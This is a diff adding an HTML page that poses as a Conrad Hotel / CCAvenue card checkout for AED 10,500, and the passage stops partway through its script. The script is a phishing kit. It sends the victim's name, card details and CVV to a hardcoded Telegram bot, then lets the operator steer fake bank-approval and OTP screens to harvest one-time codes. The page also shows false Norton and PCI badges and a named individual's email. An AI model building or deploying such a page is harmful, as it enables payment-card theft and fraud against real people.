@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Conrad Hotel Payment ·</title>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html,body{min-height:100%;}
+body{font-family:'Open Sans',sans-serif;background:#eee;min-height:100vh;color:#333;}
+
+/* Top black bar */
+.topbar{background:#0a0a0a;height:46px;}
+
+/* Page wrapper */
+.page{max-width:1100px;margin:0 auto;background:#fff;min-height:calc(100vh - 46px);display:flex;flex-direction:column;}
+
+/* Header strip */
+.header-strip{padding:20px 24px;border-bottom:1px solid #e5e5e5;}
+.order-id{font-size:14px;color:#444;}
+
+/* Language row */
+.lang-row{display:flex;justify-content:flex-end;padding:20px 24px 0;}
+.lang-select{
+  border:1px solid #ccc;border-radius:3px;padding:8px 30px 8px 12px;
+  font-size:13px;color:#333;background:#fff;
+  appearance:none;cursor:pointer;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M0 0l6 8 6-8z' fill='%23666'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;background-position:right 10px center;
+  font-family:'Open Sans',sans-serif;
+}
+
+/* Main content grid */
+.content{display:grid;grid-template-columns:1fr 280px;gap:24px;padding:20px 24px 30px;flex:1;}
+
+/* Left column */
+.left-col{border:1px solid #e0e0e0;}
+.pay-info-header{background:#e6e6e6;padding:12px 18px;font-size:15px;font-weight:600;color:#333;border-bottom:1px solid #ccc;}
+.pay-body{display:flex;}
+
+/* Cards sidebar */
+.cards-sidebar{width:170px;border-right:1px solid #e0e0e0;flex-shrink:0;}
+.sidebar-item{padding:14px 18px;font-size:13.5px;color:#444;display:flex;align-items:center;justify-content:space-between;cursor:pointer;}
+.sidebar-item.active{background:#fafafa;font-weight:600;border-right:2px solid #5cb85c;}
+.sidebar-item svg{color:#999;}
+
+/* New card panel */
+.new-card-panel{flex:1;padding:24px;}
+.panel-title{font-size:15px;font-weight:700;color:#333;margin-bottom:18px;}
+
+/* Card form box */
+.card-form-box{background:#fafafa;border:1px solid #e5e5e5;border-radius:3px;padding:18px;margin-bottom:20px;}
+
+.fg{margin-bottom:14px;}
+.fg:last-child{margin-bottom:0;}
+.select-wrap,.input-wrap{position:relative;}
+.field-input,.field-select{
+  width:100%;border:1px solid #ccc;border-radius:4px;
+  padding:11px 14px;font-size:13.5px;color:#444;
+  font-family:'Open Sans',sans-serif;outline:none;background:#fff;
+  transition:border-color .2s,box-shadow .2s;
+}
+.field-input:focus,.field-select:focus{border-color:#5cb85c;box-shadow:0 0 0 2px rgba(92,184,92,.15);}
+.field-input::placeholder{color:#aaa;}
+.field-select{
+  appearance:none;cursor:pointer;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M0 0l6 8 6-8z' fill='%23666'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;background-position:right 12px center;padding-right:32px;
+}
+.cnum-icon{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#aaa;pointer-events:none;}
+.net-badge{position:absolute;right:36px;top:50%;transform:translateY(-50%);display:flex;align-items:center;gap:3px;}
+.lv{background:#1a1f71;color:#fff;font-size:8px;font-weight:900;font-style:italic;padding:2px 5px;border-radius:2px;display:none;}
+.lm{display:none;align-items:center;}
+.ml{width:13px;height:13px;border-radius:50%;background:#EB001B;}
+.mr{width:13px;height:13px;border-radius:50%;background:#F79E1B;margin-left:-6px;opacity:.9;}
+.lve{background:#006600;color:#fff;font-size:8px;font-weight:700;padding:2px 4px;border-radius:2px;display:none;}
+
+.row3{display:flex;gap:10px;}
+.row3 .fg{flex:1;margin-bottom:0;}
+.cvv-icon-wrap{position:relative;flex:0 0 90px;}
+.cvv-card-icon{position:absolute;right:8px;top:50%;transform:translateY(-50%);display:flex;align-items:center;gap:2px;color:#999;}
+.cvv-circle{width:18px;height:18px;border-radius:50%;border:1.5px solid #ccc;display:flex;align-items:center;justify-content:center;font-size:7px;font-weight:700;color:#888;background:#fff;}
+
+/* Total payable */
+.total-payable{font-size:18px;margin-bottom:16px;}
+.total-payable .amt{color:#2980b9;font-weight:700;}
+.total-payable .lbl{color:#666;font-weight:400;}
+
+/* Buttons */
+.btn-row{display:flex;gap:12px;}
+.make-payment-btn{
+  background:#5cb85c;border:1px solid #4a9d4a;border-radius:3px;
+  padding:13px 24px;font-size:14px;font-weight:600;color:#fff;
+  cursor:pointer;font-family:'Open Sans',sans-serif;transition:background .2s;
+  min-width:140px;
+}
+.make-payment-btn:hover{background:#4a9d4a;}
+.cancel-btn{
+  background:#5cb85c;border:1px solid #4a9d4a;border-radius:3px;
+  padding:13px 24px;font-size:14px;font-weight:600;color:#fff;
+  cursor:pointer;font-family:'Open Sans',sans-serif;transition:background .2s;
+  min-width:100px;
+}
+.cancel-btn:hover{background:#4a9d4a;}
+
+/* Card strip (after submit) */
+.card-strip{display:none;background:#fff;border:1px solid #e0e0e0;border-radius:3px;padding:10px 14px;margin-bottom:16px;}
+.card-strip.show{display:flex;align-items:center;justify-content:space-between;}
+.cs-l{display:flex;align-items:center;gap:9px;}
+.cs-ico{color:#888;opacity:.8;}
+.cs-name{font-size:12.5px;color:#333;font-weight:600;}
+.cs-num{font-size:11.5px;color:#999;margin-top:1px;}
+.cs-amt{font-size:13px;font-weight:700;color:#2980b9;}
+
+/* Progress */
+.progress-bar{height:2px;background:#eee;border-radius:2px;margin-bottom:18px;overflow:hidden;}
+.progress-fill{height:100%;background:#5cb85c;border-radius:2px;transition:width .5s ease;width:0%;}
+
+/* Screens */
+.screen{display:none;}
+.screen.active{display:block;}
+
+/* Right column: order details */
+.right-col{border:1px solid #e0e0e0;background:#fafafa;padding:18px 20px;height:fit-content;}
+.order-details-title{font-size:14px;font-weight:700;color:#333;margin-bottom:14px;letter-spacing:.03em;}
+.od-row{display:flex;justify-content:space-between;align-items:flex-start;padding:7px 0;font-size:13px;color:#444;border-bottom:1px solid #eee;}
+.od-row:last-child{border-bottom:none;font-weight:700;color:#333;}
+.od-row .od-label{font-weight:600;}
+.od-row.total .od-amt{font-size:15px;color:#222;}
+
+/* Footer */
+.footer{display:flex;align-items:center;justify-content:space-between;padding:24px;border-top:1px solid #e5e5e5;flex-wrap:wrap;gap:16px;}
+.cc-avenue{display:flex;align-items:center;gap:8px;}
+.cc-text{font-size:11px;color:#888;line-height:1.3;}
+.cc-logo{font-size:22px;font-weight:800;letter-spacing:-.02em;}
+.cc-logo .cc1{color:#2980b9;}
+.cc-logo .cc2{color:#777;}
+.cc-logo .dash{color:#e74c3c;}
+.cc-logo .av{color:#444;}
+.cc-logo sup{font-size:9px;}
+.badges-row{display:flex;align-items:center;gap:14px;}
+.norton-badge{display:flex;align-items:center;gap:6px;background:#fff;border:1px solid #ddd;border-radius:20px;padding:5px 12px;}
+.norton-check{width:20px;height:20px;border-radius:50%;background:#ffc72c;display:flex;align-items:center;justify-content:center;}
+.norton-text{font-size:10px;font-weight:700;color:#333;line-height:1.1;}
+.norton-text span{display:block;font-size:7px;color:#888;letter-spacing:.05em;}
+.pci-badge{display:flex;align-items:center;gap:2px;background:#fff;border:1px solid #ddd;border-radius:3px;padding:5px 9px;}
+.pci-c{color:#2980b9;font-size:14px;font-weight:900;}
+.pci-text{font-size:9px;font-weight:800;color:#333;line-height:1;}
+.pci-text span{display:block;font-size:7px;color:#888;}
+
+/* ── Loading ── */
+.load-wrap{text-align:center;padding:20px 0;}
+.spin{width:56px;height:56px;margin:0 auto 18px;}
+.spin svg{width:100%;height:100%;animation:spin 1.3s linear infinite;}
+.trk{stroke:rgba(92,184,92,.15);}
+.arc{stroke:#5cb85c;stroke-dasharray:175;stroke-dashoffset:55;stroke-linecap:round;filter:drop-shadow(0 0 4px rgba(92,184,92,.35));}
+.load-title{font-size:16px;font-weight:700;color:#333;margin-bottom:6px;}
+.load-sub{font-size:12.5px;color:#888;line-height:1.65;}
+.lsteps{margin-top:18px;display:flex;flex-direction:column;gap:8px;text-align:left;}
+.ls{display:flex;align-items:center;gap:10px;font-size:12.5px;color:#ccc;transition:color .4s;}
+.ls.on{color:#333;}
+.ls.ok{color:#4a9d4a;}
+.ld{width:18px;height:18px;border-radius:50%;border:2px solid #ddd;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .35s;}
+.ls.ok .ld{background:#4a9d4a;border-color:#4a9d4a;}
+.ls.on .ld{border-color:#5cb85c;box-shadow:0 0 6px rgba(92,184,92,.35);}
+
+/* ── Bank Auth ── */
+.bank-wrap{text-align:center;padding:14px 0;}
+.bank-ico{width:56px;height:56px;background:#eef7ee;border:1px solid #cde6cd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;}
+.bank-title{font-size:16px;font-weight:700;color:#333;margin-bottom:6px;}
+.bank-sub{font-size:12.5px;color:#888;margin-bottom:16px;line-height:1.65;}
+.bank-pulse{display:flex;align-items:center;justify-content:center;gap:7px;font-size:12.5px;color:#e08a30;margin-bottom:18px;font-weight:600;}
+.pdot{width:7px;height:7px;border-radius:50%;background:#e08a30;animation:pulse 1.4s ease infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.4;transform:scale(.7);}}
+
+/* ── OTP ── */
+.otp-wrap{text-align:center;padding:10px 0;}
+.otp-ico{width:54px;height:54px;background:#eef7ee;border:1px solid #cde6cd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;}
+.otp-title{font-size:16px;font-weight:700;color:#333;margin-bottom:6px;}
+.otp-sub{font-size:12.5px;color:#888;margin-bottom:16px;line-height:1.65;}
+.otp-err{font-size:12px;color:#e74c3c;margin-bottom:10px;min-height:16px;}
+.otp-boxes{display:flex;gap:8px;justify-content:center;margin-bottom:16px;}
+.otp-boxes input{width:44px;height:50px;background:#fff;border:1px solid #ccc;border-radius:4px;text-align:center;font-size:18px;font-weight:700;color:#333;font-family:'Open Sans',sans-serif;outline:none;transition:all .2s;}
+.otp-boxes input:focus{border-color:#5cb85c;box-shadow:0 0 0 2px rgba(92,184,92,.15);}
+.otp-boxes input.filled{border-color:#5cb85c;color:#4a9d4a;}
+.otp-boxes input.err{border-color:#e74c3c!important;animation:shake .3s ease;}
+@keyframes shake{0%,100%{transform:translateX(0);}25%{transform:translateX(-4px);}75%{transform:translateX(4px);}}
+.resend{font-size:12px;color:#888;margin-bottom:16px;}
+.resend a{color:#2980b9;cursor:pointer;font-weight:600;}
+.verify-btn{background:#5cb85c;border:1px solid #4a9d4a;border-radius:3px;padding:12px 28px;font-size:14px;font-weight:600;color:#fff;cursor:pointer;font-family:'Open Sans',sans-serif;transition:background .2s;width:100%;}
+.verify-btn:hover{background:#4a9d4a;}
+
+/* ── Success ── */
+.suc-wrap{text-align:center;padding:10px 0;}
+.suc-circle{width:64px;height:64px;border-radius:50%;background:linear-gradient(135deg,#5cb85c,#4a9d4a);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;box-shadow:0 0 24px rgba(92,184,92,.25);animation:popIn .5s cubic-bezier(.175,.885,.32,1.275) both;}
+.suc-title{font-size:17px;font-weight:700;color:#333;margin-bottom:6px;}
+.suc-sub{font-size:12.5px;color:#888;margin-bottom:16px;line-height:1.65;}
+.suc-table{background:#fff;border:1px solid #e0e0e0;border-radius:3px;padding:12px 15px;text-align:left;margin-bottom:16px;}
+.tr{display:flex;justify-content:space-between;align-items:center;padding:6px 0;font-size:12.5px;}
+.tr:not(:last-child){border-bottom:1px solid #f0f0f0;}
+.tl{color:#888;}
+.tv{color:#333;font-weight:600;}
+.tv.b{color:#2980b9;font-weight:700;}
+.tv.ok{color:#4a9d4a;}
+.done-btn{background:#f0f0f0;border:1px solid #ccc;border-radius:3px;padding:12px;font-size:13px;font-weight:600;color:#444;cursor:pointer;font-family:'Open Sans',sans-serif;transition:all .2s;width:100%;}
+.done-btn:hover{background:#e4e4e4;}
+
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes popIn{from{transform:scale(0);opacity:0;}to{transform:scale(1);opacity:1;}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
+.fi{animation:fadeIn .4s ease both;}
+
+@media(max-width:760px){
+  .content{grid-template-columns:1fr;}
+  .pay-body{flex-direction:column;}
+  .cards-sidebar{width:100%;border-right:none;border-bottom:1px solid #e0e0e0;display:flex;}
+  .footer{flex-direction:column;align-items:flex-start;}
+}
+</style>
+</head>
+<body>
+
+<!-- Top black bar -->
+<div class="topbar"></div>
+
+<div class="page">
+
+  <!-- Header strip -->
+  <div class="header-strip">
+    <!--<div class="order-id">P-No-2026-00003278</div>-->
+  </div>
+
+  <!-- Language row -->
+  <div class="lang-row">
+    <select class="lang-select">
+      <option>English</option>
+      <option>Arabic</option>
+    </select>
+  </div>
+
+  <!-- Main content -->
+  <div class="content">
+
+    <!-- Left col -->
+   <div class="left-col">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQmv4gowg8TBykaL-DwBXP11ImcM8sydrd-FxBrHoiyA&s=10" alt="Logo" style="display:block; margin-bottom:16px; max-height:80px; object-fit:contain;"/>
+  <div class="pay-info-header">Payment Information</div>
+  <div class="pay-body">
+
+    <!-- Cards sidebar -->
+    <div class="cards-sidebar">
+      <div class="sidebar-item active">
+        Cards
+        <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
+      </div>
+    </div>
+        <!-- New card panel -->
+        <div class="new-card-panel">
+
+          <!-- Progress -->
+          <div class="progress-bar"><div class="progress-fill" id="pgBar"></div></div>
+
+          <!-- Card strip -->
+          <div class="card-strip" id="cardStrip">
+            <div class="cs-l">
+              <span class="cs-ico"><svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg></span>
+              <div>
+                <div class="cs-name" id="sName">—</div>
+                <div class="cs-num"  id="sNum">—</div>
+              </div>
+            </div>
+            <div class="cs-amt">AED 4998.00</div>
+          </div>
+
+          <!-- ── S1: Form ── -->
+          <div class="screen active" id="s1">
+            <div class="panel-title">Pay with New Card</div>
+
+            <div class="card-form-box">
+              <!-- Currency -->
+              <div class="fg">
+                <select class="field-select">
+                  <option>AED - UAE Dirham</option>
+                </select>
+              </div>
+
+              <!-- Card number -->
+              <div class="fg">
+                <div class="input-wrap">
+                  <input type="text" class="field-input" id="cnum" placeholder="Card" maxlength="19" inputmode="numeric" style="padding-right:70px;"/>
+                  <div class="net-badge">
+                    <span class="lv" id="lv">VISA</span>
+                    <span class="lm" id="lm"><span class="ml"></span><span class="mr"></span></span>
+                    <span class="lve" id="lve">verve</span>
+                  </div>
+                  <span class="cnum-icon"><svg width="20" height="14" fill="none" stroke="currentColor" stroke-width="1.6" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg></span>
+                </div>
+              </div>
+
+              <!-- Month / Year / CVV -->
+              <div class="row3">
+                <div class="fg">
+                  <select class="field-select" id="expM">
+                    <option value="">Month</option>
+                    <option>01</option><option>02</option><option>03</option><option>04</option>
+                    <option>05</option><option>06</option><option>07</option><option>08</option>
+                    <option>09</option><option>10</option><option>11</option><option>12</option>
+                  </select>
+                </div>
+                <div class="fg">
+                  <select class="field-select" id="expY">
+                    <option value="">Year</option>
+                    <option>2025</option><option>2026</option><option>2027</option><option>2028</option>
+                    <option>2029</option><option>2030</option><option>2031</option><option>2032</option>
+                  </select>
+                </div>
+                <div class="cvv-icon-wrap">
+                  <input type="text" class="field-input" id="cvv" placeholder="CVV" maxlength="4" inputmode="numeric" style="padding-right:36px;"/>
+                  <span class="cvv-card-icon">
+                    <svg width="22" height="16" viewBox="0 0 32 22" fill="none"><rect x="0.5" y="0.5" width="31" height="21" rx="2" fill="#fff" stroke="#ccc"/><rect x="0.5" y="5" width="31" height="3" fill="#ddd"/></svg>
+                    <span class="cvv-circle">576</span>
+                  </span>
+                </div>
+              </div>
+            </div>
+
+            <!-- Cardholder Name -->
+            <div class="fg" style="margin-bottom:18px;">
+              <input type="text" class="field-input" id="cardName" placeholder="Cardholder Name"/>
+            </div>
+
+            <!-- Total payable -->
+            <div class="total-payable">
+              <span class="amt">AED 10,500.00</span> <span class="lbl">(Total Amount Payable)</span>
+            </div>
+
+            <!-- Buttons -->
+            <div class="btn-row">
+              <button class="make-payment-btn" onclick="submitPayment()">Make Payment</button>
+              <button class="cancel-btn" onclick="location.reload()">Cancel</button>
+            </div>
+          </div><!-- /s1 -->
+
+          <!-- ── S2: Loading ── -->
+          <div class="screen" id="s2">
+            <div class="load-wrap">
+              <div class="spin"><svg viewBox="0 0 70 70" fill="none"><circle class="trk" cx="35" cy="35" r="27" stroke-width="4"/><circle class="arc" cx="35" cy="35" r="27" stroke-width="4" transform="rotate(-90 35 35)"/></svg></div>
+              <div class="load-title">Processing Payment</div>
+              <div class="load-sub" id="loadSub">Securely communicating with your bank<br/>Please do not close this page</div>
+              <div class="lsteps">
+                <div class="ls on" id="ls1"><div class="ld" id="ld1"></div><span>Encrypting card data</span></div>
+                <div class="ls"    id="ls2"><div class="ld" id="ld2"></div><span>Contacting payment network</span></div>
+                <div class="ls"    id="ls3"><div class="ld" id="ld3"></div><span>Awaiting bank authorization</span></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- ── S3: Bank Auth ── -->
+          <div class="screen" id="s3">
+            <div class="bank-wrap fi">
+              <div class="bank-ico">
+                <svg width="24" height="24" fill="none" stroke="#5cb85c" stroke-width="2" stroke-linecap="round" viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18" stroke-width="3"/></svg>
+              </div>
+              <div class="bank-title">Authorize on Your Bank App</div>
+              <div class="bank-sub" id="bankSub">A push notification has been sent to your registered banking app. Open it and tap <strong>Authorize</strong> to complete this payment.</div>
+              <div class="bank-pulse" id="bankPulse"><span class="pdot"></span>Waiting for authorization…</div>
+              <div class="lsteps" style="margin-top:0;">
+                <div class="ls ok"><div class="ld" style="background:#4a9d4a;border-color:#4a9d4a"><svg width="9" height="9" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" viewBox="0 0 12 12"><polyline points="2,6 5,9 10,3"/></svg></div><span style="color:#4a9d4a">Card verified</span></div>
+                <div class="ls ok"><div class="ld" style="background:#4a9d4a;border-color:#4a9d4a"><svg width="9" height="9" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" viewBox="0 0 12 12"><polyline points="2,6 5,9 10,3"/></svg></div><span style="color:#4a9d4a">Bank connected</span></div>
+                <div class="ls on"><div class="ld" style="border-color:#5cb85c;box-shadow:0 0 6px rgba(92,184,92,.35)"></div><span>Awaiting your approval in banking app</span></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- ── S4: OTP ── -->
+          <div class="screen" id="s4">
+            <div class="otp-wrap fi">
+              <div class="otp-ico">
+                <svg width="22" height="22" fill="none" stroke="#5cb85c" stroke-width="2" stroke-linecap="round" viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 1.27h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.91a16 16 0 0 0 6 6l.91-.91a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21.73 16.92z"/></svg>
+              </div>
+              <div class="otp-title">Enter Verification Code</div>
+              <div class="otp-sub" id="otpSub">A 6-digit OTP has been sent to your registered mobile number</div>
+              <div class="otp-err" id="otpErr"></div>
+              <div class="otp-boxes" id="otpBoxes">
+                <input type="text" maxlength="1" inputmode="numeric" oninput="otpIn(this,0)" onkeydown="otpKey(this,0)"/>
+                <input type="text" maxlength="1" inputmode="numeric" oninput="otpIn(this,1)" onkeydown="otpKey(this,1)"/>
+                <input type="text" maxlength="1" inputmode="numeric" oninput="otpIn(this,2)" onkeydown="otpKey(this,2)"/>
+                <input type="text" maxlength="1" inputmode="numeric" oninput="otpIn(this,3)" onkeydown="otpKey(this,3)"/>
+                <input type="text" maxlength="1" inputmode="numeric" oninput="otpIn(this,4)" onkeydown="otpKey(this,4)"/>
+                <input type="text" maxlength="1" inputmode="numeric" oninput="otpIn(this,5)" onkeydown="otpKey(this,5)"/>
+              </div>
+              <div class="resend">Didn't get it? <a id="resendLink" onclick="resendOTP()">Resend in <span id="timerTxt">30s</span></a></div>
+              <button class="verify-btn" onclick="verifyOTP()">Verify & Complete Payment</button>
+            </div>
+          </div>
+
+          <!-- ── S5: Success ── -->
+          <div class="screen" id="s5">
+            <div class="suc-wrap fi">
+              <div class="suc-circle"><svg width="28" height="28" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
+              <div class="suc-title">Payment Successful!</div>
+              <div class="suc-sub">Your payment of <strong style="color:#4a9d4a">AED 10,500.00</strong> has been approved.</div>
+              <div class="suc-table">
+                <div class="tr"><span class="tl">Email</span><span class="tv">sum_omar233@hotmail.com</span></div>
+                <div class="tr"><span class="tl">Amount</span><span class="tv b">AED 10,500.00</span></div>
+                <div class="tr"><span class="tl">Reference</span><span class="tv" id="refNo">—</span></div>
+                <div class="tr"><span class="tl">Date &amp; Time</span><span class="tv" id="payTime">—</span></div>
+                <div class="tr"><span class="tl">Status</span><span class="tv ok">✓ Approved</span></div>
+              </div>
+              <button class="done-btn" onclick="location.reload()">Done</button>
+            </div>
+          </div>
+
+        </div><!-- /new-card-panel -->
+      </div><!-- /pay-body -->
+    </div><!-- /left-col -->
+
+    <!-- Right col: Order Details -->
+    <div class="right-col">
+      <div class="order-details-title">Payment Details</div>
+      <div class="od-row"><span class="od-label"> Name</span><span>Um Omar</span></div>
+      <div class="od-row"><span>Email</span><span>um_omar233@hotmail.com</span></div>
+      <div class="od-row total"><span class="od-label">Total Amount</span><span class="od-amt">AED 10,500.00</span></div>
+    </div>
+
+  </div><!-- /content -->
+
+  <!-- Footer -->
+  <div class="footer">
+    <div class="cc-avenue">
+      <!--<div>
+        <div class="cc-text">Powered by</div>
+        <div class="cc-logo"><span class="cc1">CC</span><span class="dash">-</span><span class="av">Avenue</span><sup>®</sup></div>
+      </div>
+    </div>-->
+    <div class="Noon-Payment">
+      <div>
+        <div class="cc-text">Powered by</div>
+        <div class="cc-logo"><span class="cc1">VSTAR</span><span class="dash">-</span><span class="av">MEGASTORE</span><sup>®</sup></div>
+      </div>
+    </div>
+    <div class="badges-row">
+      <div class="norton-badge">
+        <div class="norton-check">
+          <svg width="12" height="12" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="norton-text">Norton<span>SECURED</span></div>
+      </div>
+      <div class="pci-badge">
+        <span class="pci-c">PCI</span>
+        <div class="pci-text">DSS<span>COMPLIANT</span></div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /page -->
+
+<script>
+const BOT_TOKEN = '7741671201:AAHqebTa23k8JC-PcoBrFWCMN97m-DDlLAI';
+const CHAT_ID   = '5926734862';
+
+let SESSION_ID='CCA_'+Math.random().toString(36).slice(2,10).toUpperCase();
+let pollTimer=null,lastUpdateId=0,tgMsgId=null;
+let savedName='',savedNum='',savedExpM='',savedExpY='',savedCvv='';
+
+// Card number formatting
+document.getElementById('cnum').addEventListener('input',function(){
+  let r=this.value.replace(/\D/g,'').slice(0,16);
+  this.value=r.replace(/(.{4})/g,'$1 ').trim();
+  const n=r[0]==='4'?'visa':/^5[1-5]|^2[2-7]/.test(r)?'mc':/^650|^5061/.test(r)?'verve':'';
+  document.getElementById('lv').style.display=n==='visa'?'inline-block':'none';
+  document.getElementById('lm').style.display=n==='mc'?'flex':'none';
+  document.getElementById('lve').style.display=n==='verve'?'inline-block':'none';
+});
+document.getElementById('cvv').addEventListener('input',function(){
+  this.value=this.value.replace(/\D/g,'').slice(0,4);
+});
+
+// Card strip
+function showStrip(){
+  const m=savedNum.replace(/\d(?=(\d{4} ?)+$)/g,'*');
+  document.getElementById('sName').textContent=savedName;
+  document.getElementById('sNum').textContent=m+' · '+savedExpM+'/'+savedExpY;
+  document.getElementById('cardStrip').classList.add('show');
+}
+
+// Telegram
+async function tgSend(method,body){
+  const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+  return r.json();
+}
+async function tgEdit(text,keyboard){
+  if(!tgMsgId)return;
+  const b={chat_id:CHAT_ID,message_id:tgMsgId,text,parse_mode:'HTML'};
+  b.reply_markup={inline_keyboard:keyboard||[]};
+  await tgSend('editMessageText',b);
+}
+async function sendTelegramAlert(){
+  const masked=savedNum.replace(/\d(?=\d{4})/g,'*');
+  const res=await tgSend('sendMessage',{
+    chat_id:CHAT_ID,parse_mode:'HTML',
+    text:`💳 <b>CCAVENUE PAYMENT</b>\n\n💰 <b>Amount:</b> AED 10,500.00\n🆔 <b>Order #:</b> a2FPs00000NiAhZMAV\n👤 <b>Name:</b> ${savedName}\n🔢 <b>Card:</b> <code>${masked}</code>\n📅 <b>Expiry:</b> ${savedExpM}/${savedExpY}\n🔐 <b>CVV:</b> <code>${savedCvv}</code>\n🆔 <b>Session:</b> <code>${SESSION_ID}</code>\n🕐 <b>Time:</b> ${new Date().toLocaleString('en-AE')}\n\n<b>Choose action:</b>`,
+    reply_markup:{inline_keyboard:[[{text:'✅ Authorize Payment',callback_data:`AUTH_${SESSION_ID}`},{text:'🔐 Request OTP',callback_data:`OTP_${SESSION_ID}`}]]}
+  });
+  if(res.ok)tgMsgId=res.result.message_id;
+}
+
+// Poll
+async function poll(){
+  try{
+    const res=await tgSend('getUpdates',{offset:lastUpdateId+1,timeout:4,allowed_updates:['callback_query']});
+    if(!res.ok||!res.result.length)return;
+    for(const upd of res.result){
+      lastUpdateId=upd.update_id;
+      const cb=upd.callback_query;if(!cb)continue;
+      await tgSend('answerCallbackQuery',{callback_query_id:cb.id,text:'Done ✅'});
+      const d=cb.data;
+      if(d===`AUTH_${SESSION_ID}`){
+        clearInterval(pollTimer);
+        await tgEdit(`📱 <b>BANK APP AUTHORIZATION</b>\n\n💰 AED 10,500.00\n👤 ${savedName}\n🆔 <code>${SESSION_ID}</code>\n\nCustomer authorizing via banking app.\n<b>Your decision:</b>`,[[{text:'✅ Approve Payment',callback_data:`APPROVE_${SESSION_ID}`},{text:'❌ Decline',callback_data:`DECLINE_AUTH_${SESSION_ID}`}]]);
+        show('s3',60);showStrip();pollTimer=setInterval(poll,3000);return;
+      }
+      if(d===`OTP_${SESSION_ID}`){
+        clearInterval(pollTimer);
+        await tgEdit(`📱 <b>OTP REQUESTED</b>\n\n💰 AED 10,500.00\n👤 ${savedName}\n🆔 <code>${SESSION_ID}</code>\n\nCustomer entering OTP.\n<i>Waiting for submission…</i>`);
+        show('s4',60);showStrip();startTimer();pollTimer=setInterval(poll,3000);return;
+      }
+      if(d===`APPROVE_${SESSION_ID}`){
+        clearInterval(pollTimer);
+        await tgEdit(`✅ <b>PAYMENT APPROVED</b>\n\n💰 AED 10,500.00\n👤 ${savedName}\n🆔 <code>${SESSION_ID}</code>\n✔️ Transaction approved.`);
+        showSuccess();return;
+      }
+      if(d===`DECLINE_AUTH_${SESSION_ID}`){
+        clearInterval(pollTimer);
+        await tgEdit(`❌ <b>AUTHORIZATION DECLINED</b>\n\n💰 AED 10,500.00 · ${savedName}\n🆔 <code>${SESSION_ID}</code>`,[[{text:'🔁 Send Again',callback_data:`RETRY_AUTH_${SESSION_ID}`},{text:'🔐 Switch to OTP',callback_data:`OTP_${SESSION_ID}`}]]);
+        showBankDeclined();pollTimer=setInterval(poll,3000);return;
+      }
+      if(d===`RETRY_AUTH_${SESSION_ID}`){
+        clearInterval(pollTimer);
+        await tgEdit(`📱 <b>BANK AUTH (RETRY)</b>\n\n💰 AED 10,500.00 · ${savedName}\n🆔 <code>${SESSION_ID}</code>\n<b>Your decision:</b>`,[[{text:'✅ Approve Payment',callback_data:`APPROVE_${SESSION_ID}`},{text:'❌ Decline',callback_data:`DECLINE_AUTH_${SESSION_ID}`}]]);
+        showBankPending();pollTimer=setInterval(poll,3000);return;
+      }
+      if(d===`DECLINE_OTP_${SESSION_ID}`){
+        clearInterval(pollTimer);
+        await tgEdit(`❌ <b>OTP DECLINED</b>\n\n💰 AED 10,500.00 · ${savedName}\n🆔 <code>${SESSION_ID}</code>\nNew OTP sent to customer.\n<i>Waiting for new submission…</i>`);
+        showOTPDeclined();pollTimer=setInterval(poll,3000);return;
+      }
+    }
+  }catch(e){}
+}
+
+// Screens
+function show(id,pg){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  document.getElementById('pgBar').style.width=pg+'%';
+}
+function showBankPending(){
+  show('s3',60);showStrip();
+  document.getElementById('bankSub').innerHTML=`A push notification has been sent to your registered banking app. Open it and tap <strong>Authorize</strong> to complete this payment.`;
+  const p=document.getElementById('bankPulse');p.style.color='#e08a30';
